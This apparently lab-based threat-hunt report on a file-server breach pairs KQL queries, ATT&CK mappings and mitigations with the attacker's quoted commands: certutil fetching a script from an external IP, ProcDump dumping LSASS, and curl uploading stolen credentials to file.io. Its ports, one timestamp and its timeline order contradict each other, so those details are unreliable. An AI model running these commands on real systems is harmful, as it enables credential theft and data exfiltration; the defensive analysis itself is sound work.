# Threat Hunt Report: File Server Breach and Multi-Stage Exfiltration

## Executive Summary

Azuki Import & Export Trading Co. experienced continued malicious activity approximately 72 hours after the initial compromise that occurred between November 18-19, 2025. The attacker returned on November 21, 2025, conducted lateral movement to the organization's file server, and executed a sophisticated data exfiltration operation. The investigation revealed behavior consistent with ADE SPIDER (APT-SL44, SilentLynx), involving lateral movement using compromised credentials, extensive reconnaissance, credential theft via LSASS memory dumping, data staging and compression, exfiltration to cloud storage, establishment of persistence mechanisms, and anti-forensics activities. This investigation reconstructs the complete attack timeline and documents the threat actor's tactics, techniques, and procedures.

## Background
- **Incident Date:** November 21-22, 2025  
- **Compromised Host:** azuki-fileserver01  
- **Threat Actor:** ADE SPIDER (APT-SL44, SilentLynx)  
- **Motivation:** Financial  
- **Target Profile:** Logistics and import/export companies, East Asia region  
- **Typical Dwell Time:** 21-45 days  
- **Attack Sophistication:** Moderate with preference for low-footprint techniques

---

## Investigation Steps

### 1. Initial Access: Return Connection Source

The attacker returned approximately 72 hours after the initial compromise using a different IP address to evade detection. The analysis revealed that the IP address 159.26.106.98 was the attacker's return connection. Since it's distinct from the original compromise IP, it's likely that the attacker attempted to utilize infrastructure rotation as an evasion technique.

**Query used to locate events:**

```kql
DeviceLogonEvents
| where DeviceName contains "azuki"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-24))
| where ActionType == "LogonSuccess"
| where isnotempty(RemoteIP)
| project TimeGenerated, RemoteIP, AccountName, LogonType
| order by TimeGenerated asc

```
<img width="1923" height="637" alt="CH_Q1" src="https://github.com/user-attachments/assets/852e4110-1588-46ad-b8a4-19908d3ee061" />

---

### 2. Lateral Movement: Compromised Device & Compromised Account

Searched for evidence of lateral movement and discovered multiple RDP connections to the IP address 10.1.0.108, which was then correlated with logon events to identify the device name. The attacker used Remote Desktop (mstsc.exe) from the compromised system (azuki-sl) to connect to IP address 10.1.0.108. Further investigation revealed that the attacker performed lateral movement from the compromised workstation to the organization's primary file server (i.e., azuki-fileserver01), positioning themselves to access sensitive business data. In addition, the investigation also revealed that the attacker moved laterally to the file server using the fileadmin account. Compromising an administrative account with file management privileges also provides the attacker with elevated access to file shares and sensitive data.

**Queries used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName contains "azuki"
| where FileName == "mstsc.exe"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| project TimeGenerated, ProcessCommandLine, DeviceName
| order by TimeGenerated asc

```
<img width="1811" height="416" alt="CH_Q2A" src="https://github.com/user-attachments/assets/809b1b6d-290a-469d-bd4e-36bc5d145b24" />

---

```kql
DeviceLogonEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where RemoteIP == "10.1.0.108"
| project TimeGenerated, DeviceName, RemoteIP, AccountName
| order by TimeGenerated asc

```
<img width="1786" height="929" alt="CH_Q2B" src="https://github.com/user-attachments/assets/ea68537c-539e-4168-9efa-dc8af73b68fb" />

---

### 3. Discovery: Share Enumeration

Searched for evidence of network share enumeration and discovered that the attacker executed the net share command to enumerate local network shares on the compromised file server. This command reveals all shared folders on the local system, allowing the attacker to identify sensitive data repositories for collection.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has "net" and ProcessCommandLine has "share"
| project TimeGenerated, ProcessCommandLine, FileName, AccountName
| order by TimeGenerated asc

```
<img width="2069" height="273" alt="CH_Q4A" src="https://github.com/user-attachments/assets/308e0369-64bf-49af-8cb7-96e69f9722d7" />

---

### 4. Discovery: Remote Share Enumeration

Searched for evidence of remote network share enumeration and discovered that the attacker utilized the command "net view \\10.1.0.188" to enumerate shares on a remote system (i.e., IP 10.1.0.188), expanding the attacker's knowledge of available data repositories across the network.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "net.exe"
| where ProcessCommandLine has "\\"
| project TimeGenerated, ProcessCommandLine, FileName
| order by TimeGenerated asc

```
<img width="1393" height="265" alt="CH_Q5" src="https://github.com/user-attachments/assets/6efb33b4-19f0-404d-86b9-71907c11c84b" />

---

### 5. Discovery: Privilege Enumeration 

Searched for evidence of privilege enumeration and discovered that the attacker utilized the command "whoami.exe" /all" which provides comprehensive details about the security context of the compromised system including user name, security identifier (SID), group memberships, and privileges, enabling the attacker to understand their current access level.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "whoami.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1677" height="331" alt="CH_Q6" src="https://github.com/user-attachments/assets/e7882ca0-982d-4ad6-b458-2280585d3d61" />

---

### 6. Discovery: Network Configuration 

Searched for evidence of network configuration enumeration and discovered that the attacker utilized the command ""ipconfig.exe" /all" to better understand the environment topology. This command reveals comprehensive network details including DNS servers, DHCP configuration, domain membership, MAC addresses, and all network adapters, providing the attacker with a complete picture of the network environment.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "ipconfig.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1720" height="275" alt="CH_Q7" src="https://github.com/user-attachments/assets/d58c65c0-8a78-4232-9407-3c0dc237fc69" />

---

### 7. Defense Evasion: Directory Hiding & Staging Directory Path

Searched for evidence of the modification of file system attributes since this is a technique employed by attackers to hide directories. This analysis revealed that the attacker modified file attributes to hide their staging directory utilizing the command ""attrib.exe" +h +s C:\Windows\Logs\CBS" and made it appear as a protected Windows system component. This command sets both hidden (+h) and system (+s) attributes on the directory, causing it to blend in with legitimate Windows system folders. The CBS (Component-Based Servicing) folder name was chosen to appear as a legitimate Windows log directory. In addition, the staging directory path was C:\Windows\Logs\CBS. This staging directory was created in a location designed to masquerade as legitimate Windows system logs, making it less likely to be discovered during casual system inspection.
 
**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FileName == "attrib.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1703" height="286" alt="CH_Q8" src="https://github.com/user-attachments/assets/e2586234-e6de-4413-930f-e990e891da3b" />

---

### 8. Defense Evasion: Script Download 

Searched for evidence of malware download activity and discovered that the attacker utilized certutil.exe, a legitimate Windows certificate management utility, to download a PowerShell script (i.e., "ex.ps1") to the hidden staging directory using the following command: "certutil.exe" -urlcache -f http://78.141.196.6:7331/ex.ps1 C:\Windows\Logs\CBS\ex.ps1.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where ProcessCommandLine has_any ("certutil", "bitsadmin", "urlcache")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2298" height="420" alt="CH_Q9" src="https://github.com/user-attachments/assets/a336c803-3d5e-4fcd-a379-b70201e04c4e" />

---

### 9. Collection: Credential File Discovery

Searched for evidence of credential file creation and discovered that the attacker created a credential file (i.e., IT-Admin-Passwords.csv)in the staging directory. This file contains exported credentials (e.g., IT administrator passwords), likely harvested from password managers, browser storage, or credential stores. The descriptive filename indicates the attacker organized their stolen data for easy identification during exfiltration.

**Query used to locate events:**

```kql
DeviceFileEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where FolderPath has "CBS"
| where FileName endswith ".csv"
| project TimeGenerated, FileName, FolderPath, ActionType

```
<img width="2160" height="275" alt="CH_Q11" src="https://github.com/user-attachments/assets/5522277f-9363-41b3-a2a5-9e97016cc7ff" />

---

### 10. Collection: Recursive Copy  

Searched for evidence of bulk data collection activities and discovered that the attacker used xcopy to recursively copy entire file share directories to the staging location using the following command: xcopy C:\FileShares\IT-Admin C:\Windows\Logs\CBS\it-admin /E /I /H /Y. This command specifically targeted the IT-Admin share containing credential files and administrative documentation.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("robocopy", "xcopy")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2175" height="669" alt="CH_Q12" src="https://github.com/user-attachments/assets/19c0aeca-93d0-44df-afde-b0b72eb9e728" />

---
### 11. Collection: Compression

Searched for evidence of archive creation and discovered that the attacker used tar (i.e., a cross-platform compression tool not native to legacy Windows environments) to compress the staged credentials. The attacker utilized the following command to compress the IT-Admin credentials folder into a portable .tar.gz format suitable for exfiltration: "tar.exe" -czf C:\Windows\Logs\CBS\credentials.tar.gz -C C:\Windows\Logs\CBS\it-admin.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where DeviceName == "azuki-fileserver01"
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where ProcessCommandLine has_any ("7z", "tar", "rar")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="2284" height="884" alt="CH_Q13" src="https://github.com/user-attachments/assets/275f8aa9-8da4-450c-bc71-e41f052f2c22" />

---

### 12. Credential Access: Renamed Tool

Searched for evidence of executable file creation events in attacker-controlled directories in order to identify renamed credential dumping tools since this is a common OPSEC practice used for evading signature-based detection. This analysis revealed that the attacker renamed a credential dumping tool to a short, inconspicuous name (i.e., "pd.exe") that could blend in with program data or system processes.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName endswith ".exe"
| where FolderPath has "Windows\\Logs\\CBS"
| where ActionType == "FileCreated"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2203" height="283" alt="CH_Q14" src="https://github.com/user-attachments/assets/65c498e1-7125-4ff3-a2f7-ce552eab5d3f" />

---

### 13. Credential Access: Memory Dump 

Searched for evidence of credential dumping activities and discovered that ProcDump (renamed to pd.exe) was used to dump LSASS process memory using the command: "pd.exe" -accepteula -ma 876 C:\Windows\Logs\CBS\lsass.dmp. LSASS memory contains credentials for logged-on users, enabling the attacker to extract plaintext and hashed passwords for privilege escalation and lateral movement.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "pd.exe" or ProcessCommandLine has "pd.exe"
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1940" height="293" alt="CH_Q15" src="https://github.com/user-attachments/assets/f4dc6421-1080-4885-99dc-04814ddbb47a" />

---

### 14. Exfiltration: Upload & Cloud Service

Searched for evidence of data exfiltration and discovered that the attacker used curl with form-based transfer syntax (i.e., -F: Form-based file upload; multipart/form-data HTTP POST) to upload the compressed credential archive to a temporary file hosting service (i.e., file.io) using the command: curl -F file=@C:\Windows\Logs\CBS\credentials.tar.gz https://file.io. File.io is a temporary file hosting service that requires no authentication, automatically deletes files after download, leaves minimal traces for forensic investigation, blends with legitimate file sharing traffic, and provides anonymous upload capability.

**Query used to locate events:**

```kql
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where FileName == "curl.exe"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

```
<img width="1776" height="595" alt="CH_Q16" src="https://github.com/user-attachments/assets/6740b98d-1933-40ec-8173-485f0e3991f5" />

---

### 15. Persistence: Registry Value Name & Beacon Filename

Searched for evidence of persistence and discovered the creation of a registry Run key with a value name designed to appear as legitimate software (i.e., FileShareSync). This registry value name was likely chosen to appear as legitimate file synchronization software (i.e., a service that would be expected on a file server). The persistence mechanism launches a hidden PowerShell script on every system startup, ensuring the attacker maintains access even after system reboots or credential changes. In addition, the beacon script (i.e., svchost.ps1) was named after the legitimate Windows Service Host (svchost.exe) process in order to make the file appear legitimate in directory listings, reduce suspicion if discovered during casual system inspection, or blend with legitimate Windows processes in monitoring tools. The PowerShell script serves as a persistence beacon, likely establishing command-and-control connectivity or executing additional payloads on system startup.

**Query used to locate events:**

```kql
DeviceRegistryEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where RegistryKey has "Run"
| project TimeGenerated, RegistryKey, RegistryValueName, RegistryValueData
| order by TimeGenerated asc

```
<img width="2468" height="338" alt="CH_Q18" src="https://github.com/user-attachments/assets/217c2811-c18a-4e62-9c05-f9ff8fb79bc6" />

---

### 16. Anti-Forensics: History File Deletion

Searched for anti-forensics activities and discovered the deletion of the PowerShell command history file (i.e., ConsoleHost_history.txt). This file logs all interactive PowerShell commands across sessions and is commonly targeted by attackers to remove evidence of their activities. The deletion occurred after the completion of data exfiltration and persistence establishment, indicating a deliberate attempt to cover tracks.

**Query used to locate events:**

```kql
DeviceFileEvents
| where TimeGenerated between (datetime(2025-11-21) .. datetime(2025-11-25))
| where DeviceName == "azuki-fileserver01"
| where ActionType == "FileDeleted"
| where FileName has "history"
| project TimeGenerated, FileName, FolderPath, ActionType
| order by TimeGenerated asc

```
<img width="2667" height="282" alt="CH_Q20B" src="https://github.com/user-attachments/assets/2f6b774f-3802-4b6d-a66b-1bfbdec660be" />

---

## Summary

The investigation revealed a sophisticated continuation of the initial Azuki Import & Export Trading Co. compromise. The attacker returned approximately 72 hours after initial access using a different source IP address (159.26.106.98), conducted lateral movement to the file server (azuki-fileserver01) using the compromised fileadmin account, and executed a multi-stage data exfiltration operation.

The threat actor demonstrated advanced tradecraft by conducting extensive reconnaissance (net share, net view, whoami /all, ipconfig /all), establishing a hidden staging directory (C:\Windows\Logs\CBS) disguised as Windows Component-Based Servicing logs, using Living Off the Land Binaries (certutil.exe, xcopy.exe, tar.exe, curl.exe) to avoid detection, renaming credential dumping tools (pd.exe) to evade signature-based detection, dumping LSASS memory to extract credentials, compressing stolen data into portable archives, exfiltrating data to file.io cloud storage, establishing registry-based persistence (FileShareSync) with a masqueraded beacon (svchost.ps1), and deleting PowerShell command history to remove forensic evidence.

The attack specifically targeted IT administrative credentials stored in IT-Admin-Passwords.csv and successfully exfiltrated this sensitive data along with LSASS memory dumps containing cached credentials. The sophistication of this attack, including the use of multiple defense evasion techniques, persistence mechanisms, and anti-forensics measures, is consistent with ADE SPIDER's known tactics, techniques, and procedures. The targeting of a logistics company in East Asia aligns with the group's established operational patterns and financial motivation.

---

## Timeline

| Time (UTC) | Action Observed | Key Evidence |
|:------------:|:-----------------:|:--------------:|
| 2025-11-21 19:42:01 | Remote Share Enumeration | net.exe view \\10.1.0.188 executed to enumerate backup server |
| 2025-11-22 00:40:09 | Privilege Enumeration | whoami.exe /all executed to enumerate security context |
| 2025-11-22 00:42:24 | Network Configuration | ipconfig.exe /all executed to enumerate network settings |
| 2025-11-22 00:55:43 | Defense Evasion: Directory Hiding | attrib.exe +h +s applied to C:\Windows\Logs\CBS staging directory |
| 2025-11-22 00:56:47 | Script Download | certutil.exe downloaded ex.ps1 from 78.141.196.6:8080 |
| 2025-11-22 03:57:51 | Credential File Discovery | IT-Admin-Passwords.csv accessed in IT-Admin file share |
| 2025-11-22 05:21:07 | Recursive Data Copy | xcopy.exe copied IT-Admin share to staging directory |
| 2025-11-22 05:31:30 | Compression | tar compressed IT-Admin data into credentials.tar.gz |
| 2025-11-22 08:19:38 | Renamed Tool Deployment | pd.exe (renamed ProcDump) created in staging directory |
| 2025-11-22 08:44:39 | Credential Dumping | pd.exe dumped LSASS memory (PID 876) to lsass.dmp |
| 2025-11-22 09:54:27 | Data Exfiltration | curl.exe uploaded credentials.tar.gz to file.io |
| 2025-11-22 10:50:82 | Persistence: Registry | FileShareSync value created in HKLM Run key launching svchost.ps1 |
| 2025-11-22 12:27:53 | Return Access | External RDP connection from 159.26.106.98 using kenji.sato |
| 2025-11-22 12:38:47 | Lateral Movement: RDP | mstsc.exe executed targeting 10.1.0.188 |
| 2025-11-22 14:01:16 | Anti-Forensics | ConsoleHost_history.txt deleted to remove PowerShell command evidence |
| 2025-11-24 14:40:54 | Lateral Movement: Logon | fileadmin account logged into azuki-fileserver01 from 10.1.0.108 |
| 2025-11-24 14:42:01 | Local Share Enumeration | net.exe share executed on azuki-fileserver01 |

---

**Note:** Network reconnaissance occurred on November 21, prior to the external RDP connection observed on November 22, suggesting potential earlier compromise through an unidentified vector.

---

## Relevant MITRE ATT&CK TTPs

| TTP ID | TTP Name | Description | Detection Relevance |
|:--------:|:----------:|:-------------:|:---------------------:|
| T1078 | Valid Accounts: Local Accounts | Compromised fileadmin account used for lateral movement to file server | Identifies authentication with compromised credentials from external sources |
| T1021.001 | Remote Services: Remote Desktop Protocol | External RDP connection from 159.26.106.98 and lateral movement via mstsc.exe to 10.1.0.108 | Detects unauthorized external RDP connections and internal lateral movement |
| T1135 | Network Share Discovery | net share and net view \\10.1.0.188 executed to enumerate local and remote shares | Indicates reconnaissance activity prior to data collection |
| T1033 | System Owner/User Discovery | whoami /all executed to enumerate current user privileges and group memberships | Identifies privilege enumeration prior to credential theft |
| T1016 | System Network Configuration Discovery | ipconfig /all executed to enumerate network adapter settings and domain information | Indicates comprehensive network reconnaissance activity |
| T1564.001 | Hide Artifacts: Hidden Files and Directories | attrib +h +s applied to C:\Windows\Logs\CBS staging directory | Identifies attempts to conceal malicious artifacts through file attribute modification |
| T1074.001 | Data Staged: Local Data Staging | C:\Windows\Logs\CBS used to consolidate collected data before exfiltration | Detects data staging in non-standard locations mimicking system directories |
| T1105 | Ingress Tool Transfer | certutil.exe abused to download ex.ps1 from 78.141.196.6:8080 | Identifies LOLBin abuse for malware downloads |
| T1119 | Automated Collection | xcopy executed with /E /I /H /Y flags to recursively copy IT-Admin file share | Detects bulk data collection with attribute preservation |
| T1560.001 | Archive Collected Data: Archive via Utility | tar used to compress credentials.tar.gz with gzip compression | Identifies data compression prior to exfiltration using cross-platform tools |
| T1036.005 | Masquerading: Match Legitimate Name or Location | pd.exe (ProcDump renamed) and svchost.ps1 (PowerShell script) used to evade detection | Detects renamed tools and masqueraded filenames mimicking legitimate Windows components |
| T1003.001 | OS Credential Dumping: LSASS Memory | pd.exe (ProcDump) dumped LSASS process memory (PID 876) to lsass.dmp | Identifies credential theft from LSASS memory using legitimate administrative tools |
| T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage | curl uploaded credentials.tar.gz to file.io cloud storage | Detects data exfiltration to temporary file hosting services |
| T1547.001 | Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | FileShareSync registry value created in HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run | Detects registry-based persistence mechanisms with deceptive value names |
| T1070.003 | Indicator Removal: Clear Command History | ConsoleHost_history.txt deleted to remove PowerShell command evidence | Identifies anti-forensics activities targeting command history files |

---

This table organizes the MITRE ATT&CK techniques (TTPs) observed during the investigation. The detection methods identified both the attack techniques and enabled confirmation of the threat actor's sophistication through multiple layers of defense evasion, persistence, and anti-forensics.

---

## Response Taken

| MITRE Mitigation ID | Name | Action Taken | Description | Relevance |
|:---------------------:|:------:|:--------------:|:-------------:|:-----------:|
| M1032 | Multi-factor Authentication | Enforced MFA | Enforced MFA for all RDP connections and privileged account access. Implemented conditional access policies requiring MFA for external connections. | Prevents lateral movement via compromised passwords by requiring additional authentication factors. |
| M1027 | Password Reset | Account Credential Reset | Reset credentials for fileadmin account and implemented mandatory password change with MFA enrollment. Rotated all passwords in IT-Admin-Passwords.csv. | Mitigates unauthorized access risks by invalidating potentially compromised credentials stored in exfiltrated files. |
| M1026 | Privileged Account Management | Administrative Access Review | Conducted comprehensive audit of all privileged accounts. Implemented principle of least privilege for file share access. | Prevents unauthorized access attempts by restricting administrative privileges to necessary personnel only. |
| M1054 | Software Configuration | LOLBin Restrictions | Implemented Group Policy to restrict certutil.exe execution to authorized administrators only. Configured application control policies to limit LOLBin abuse. | Prevents attackers from abusing legitimate Windows utilities for malware downloads and data exfiltration. |
| M1038 | Execution Prevention | Constrained Language Mode | Implemented PowerShell Constrained Language Mode on file servers to restrict unapproved script execution. | Prevents unauthorized PowerShell scripts like svchost.ps1 from executing malicious payloads. |
| M1047 | Audit | Enhanced PowerShell Logging | Enabled PowerShell script block logging and module logging across all endpoints to capture full command execution context including obfuscated scripts. | Enables early detection of future malicious PowerShell activity and provides forensic evidence even if ConsoleHost_history.txt is deleted. |
| M1042 | Disable or Remove Feature or Program | Restrict System Utilities | Restricted tar.exe and curl.exe execution through application control policies. Deployed monitoring for cross-platform compression tools. | Prevents abuse of legitimate utilities for data compression and exfiltration. |
| M1031 | Network Intrusion Prevention | Network Egress Filtering | Blocked outbound connections to file.io and similar temporary file hosting services. Implemented egress filtering for HTTP/HTTPS file uploads. | Prevents data exfiltration to cloud storage services commonly abused for data theft. |
| M1037 | Filter Network Traffic | RDP Access Restrictions | Restricted RDP access through jump servers with MFA. Implemented network segmentation to isolate file servers from workstations. | Limits lateral movement opportunities by enforcing strict access controls for remote connections. |
| M1030 | Network Segmentation | VLAN Segmentation | Deployed VLAN segmentation between workstations, file servers, and administrative systems with firewall rules enforcing least privilege access. | Compartmentalizes network to restrict lateral movement paths even with compromised credentials. |
| M1018 | User Account Management | Account Lockout Policy | Implemented stricter account lockout thresholds and account monitoring for suspicious activity detection including failed RDP attempts. | Adds security layers to prevent unauthorized access attempts through brute force or credential stuffing. |
| M1028 | Operating System Configuration | Application Control (WDAC) | Deployed Windows Defender Application Control policies to prevent execution of renamed binaries like pd.exe in non-standard directories. | Restricts execution of unauthorized applications through code integrity policies. |
| M1022 | Restrict File and Directory Permissions | File Share Hardening | Removed write permissions for standard users to sensitive file shares. Implemented file integrity monitoring for IT-Admin and other administrative shares. | Prevents unauthorized file access and detects suspicious modifications to sensitive data repositories. |
| M1041 | Encrypt Sensitive Information | Data at Rest Encryption | Implemented BitLocker encryption on file servers. Deployed file-level encryption for sensitive administrative files. | Protects stolen data from being useful to attackers even if exfiltrated. |
| M1053 | Data Backup | Offline Backup Strategy | Implemented offline backup copies stored separately from network-accessible locations. Verified backup integrity and restore procedures. | Ensures data recovery capability independent of compromised network systems. |
| M1017 | User Training | Security Awareness Training | Conducted mandatory security awareness training for affected users and IT staff, focusing on credential protection, recognizing suspicious RDP access, and reporting anomalous file server activity. | Reduces likelihood of future credential compromise through social engineering and improves detection of suspicious activities. |

---

The following response actions were recommended: (1) Isolating the compromised file server from the network to prevent further data exfiltration; (2) Resetting credentials for fileadmin account and all passwords stored in IT-Admin-Passwords.csv with mandatory MFA enrollment; (3) Removing persistence mechanisms including FileShareSync registry value and svchost.ps1 beacon script; (4) Deleting malicious artifacts including pd.exe, ex.ps1, lsass.dmp, and credentials.tar.gz from staging directory; (5) Implementing Group Policy restrictions on LOLBin execution (certutil, curl, tar) and PowerShell script execution; (6) Enabling enhanced PowerShell script block and module logging across all systems; (7) Blocking outbound connections to file.io and similar temporary file hosting services; (8) Implementing RDP access restrictions through jump servers with MFA and network segmentation; (9) Deploying Windows Defender Application Control policies to prevent renamed binary execution; (10) Hardening file share permissions and implementing file integrity monitoring; (11) Conducting mandatory security awareness training focusing on credential protection and suspicious activity recognition; (12) Implementing offline backup strategy independent of network-accessible systems.

---
